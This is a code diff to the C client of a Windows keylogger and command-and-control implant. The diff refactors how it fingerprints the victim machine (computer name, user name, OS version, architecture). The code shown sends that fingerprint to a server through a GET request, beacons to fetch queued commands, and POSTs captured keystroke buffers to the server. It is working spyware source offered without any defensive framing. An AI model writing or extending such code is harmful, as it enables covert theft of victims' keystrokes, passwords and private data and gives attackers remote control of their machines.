@@ -3,15 +3,16 @@
 
 #include "client.h"
 
+static void retrieveVersionInfo(char* version);
+static void retrieveArchInfo(char* arch);
 
 /**
  * Initialises the client structure, retrieves the username and computername
  * of the client and stores it as their ID. Then generates two and internet and 
  */
 CLIENT_HANDLER* initClient() {
-    CLIENT_HANDLER* client = (CLIENT_HANDLER *) malloc(sizeof(CLIENT_HANDLER));
+    CLIENT_HANDLER* client = malloc(sizeof(CLIENT_HANDLER));
     if (client == NULL) { return NULL; }
-
     memset(client->id, '\0', MAX_ID_LEN);
     memset(client->cmdBuffer, '\0', MAX_BUFF_LEN);
 
@@ -24,9 +25,10 @@ CLIENT_HANDLER* initClient() {
     char buffCompName[size];
     if (!GetComputerNameA(buffCompName, &size)) { return NULL; }  // failed to get computer name
     
-    // initialise the client id, we can now register them with the server
+    // initialise and encode the client id, we can now register them with the server
     sprintf(client->id, "%s-%s", buffCompName, buffUser);
-    
+    // encode(client->id, freshEncodingKeyPtr(client->ENC_KEY));
+
     // establish connection
     HINTERNET hSession = InternetOpenA("server", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (hSession == NULL) { return NULL; }
@@ -41,38 +43,23 @@ CLIENT_HANDLER* initClient() {
 
 
 /**
- * Retrieev all cleint registration information and sent it to the server. 
- * The server responds with the random encoding key which is stored in the 
+ * Retrieev all cleint registration information and sent it to the server.
+ * The server responds with the random encoding key which is stored in the
  * key logger
  */
 ERR_CODE registerClient(CLIENT_HANDLER *client) {
     time_t seconds = getCurrentTime();
 
-    OSVERSIONINFOA vInfo =  { 0 };   // gets version information
-    vInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
-
+    // retrieve and encode version and architecture
     char version[32];
-    if (!GetVersionExA(&vInfo)) {
-        sprintf(version, "UNKNOWN-WIN-V");
-    } else {
-        sprintf(version, "WIN-%ld.%ld", vInfo.dwMajorVersion, vInfo.dwMinorVersion);
-    }
+    retrieveVersionInfo(version);
 
-    SYSTEM_INFO sInfo;   // get architecture information
-    GetSystemInfo(&sInfo);
-
-    char* arch = "UNKNOWN";   // PROCESSOR_ARCHITECTURE_UNKNOWN
-    switch (sInfo.wProcessorArchitecture) {
-        case PROCESSOR_ARCHITECTURE_AMD64: arch = "AMD-INTEL"; break;
-        case PROCESSOR_ARCHITECTURE_ARM:   arch = "ARM"; break;
-        case PROCESSOR_ARCHITECTURE_ARM64: arch = "ARM64"; break;
-        case PROCESSOR_ARCHITECTURE_IA64:  arch = "Intel-Itanium"; break;
-        case PROCESSOR_ARCHITECTURE_INTEL: arch = "x86"; break;
-    }
+    char arch[16];
+    retrieveArchInfo(arch);
 
     // send the register data that includes system infomation!
     char registerStr[MAX_MSG_LEN];
-    snprintf(registerStr, MAX_MSG_LEN, "/register?id=%s&os=%s&arch=%s&time=%lld", client->id, version, arch, seconds);
+    snprintf(registerStr, MAX_MSG_LEN, "/register?id=%s&os=%s&arch=%s&time=%ld", client->id, version, arch, seconds);
 
     // (ab)uses GET request to send os fingerprint
     HINTERNET hRequest = HttpOpenRequestA(client->hConnect, "GET", registerStr, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
@@ -96,14 +83,51 @@ ERR_CODE registerClient(CLIENT_HANDLER *client) {
     return ECODE_SUCCESS;
 }
 
+/**
+ * retrieve the wiundwos version information to be sent as part
+ * of the register 
+ */
+static void retrieveVersionInfo(char* version) {
+    OSVERSIONINFOA vInfo =  { 0 };   // gets version information
+    vInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
+    if (!GetVersionExA(&vInfo)) {
+        sprintf(version, "UNKNOWN-WIN-V");
+    } else {
+        sprintf(version, "WIN-%ld.%ld", vInfo.dwMajorVersion, vInfo.dwMinorVersion);
+    }
+}
 
 /**
- * performs an HTTP GET request to the server to get all the this client queued commands!
+ * retrieves the architecture string associated with the client 
+ * machine
+ */
+static void retrieveArchInfo(char* arch) {
+    SYSTEM_INFO sInfo;   // get architecture information
+    GetSystemInfo(&sInfo);
+
+    switch (sInfo.wProcessorArchitecture) {
+        case PROCESSOR_ARCHITECTURE_AMD64:
+            sprintf(arch, "AMD-INTEL"); break;
+        case PROCESSOR_ARCHITECTURE_ARM:
+            sprintf(arch, "ARM"); break;
+        case PROCESSOR_ARCHITECTURE_ARM64:
+            sprintf(arch, "ARM64"); break;
+        case PROCESSOR_ARCHITECTURE_IA64:
+            sprintf(arch, "Intel-Itanium"); break;
+        case PROCESSOR_ARCHITECTURE_INTEL:
+            sprintf(arch, "x86"); break;
+        default:
+            sprintf(arch, "UNKNOWN"); break;
+    }
+}
+
+/**
+ * performs an HTTP GET request to the server to get all the this client queued commands
  */
 ERR_CODE pollCommandsAndBeacon(CLIENT_HANDLER *client) {
     time_t seconds = getCurrentTime();
     char commandRequ[MAX_MSG_LEN];
-    snprintf(commandRequ, MAX_MSG_LEN, "/commands?cid=%s&time=%lld", client->id, seconds);
+    snprintf(commandRequ, MAX_MSG_LEN, "/commands?cid=%s&time=%ld", client->id, seconds);
 
     // set up the request
     HINTERNET hRequest = HttpOpenRequestA(client->hConnect, "GET", commandRequ, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
@@ -138,7 +162,7 @@ ERR_CODE writeKeyLog(CLIENT_HANDLER* client, const char* keyBuffer, const int bu
     HINTERNET hRequest = HttpOpenRequestA(client->hConnect, "POST", logStr, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
     if (hRequest == NULL) { return ECODE_POST; }
 
-    HttpSendRequestA(hRequest, PLAIN_TEXT_H, strlen(PLAIN_TEXT_H), (LPVOID)keyBuffer, bufferLen);
+    HttpSendRequestA(hRequest, PLAIN_TEXT_H, strlen(PLAIN_TEXT_H), (LPVOID) keyBuffer, bufferLen);
     InternetCloseHandle(hRequest);
 
     return ECODE_SUCCESS;
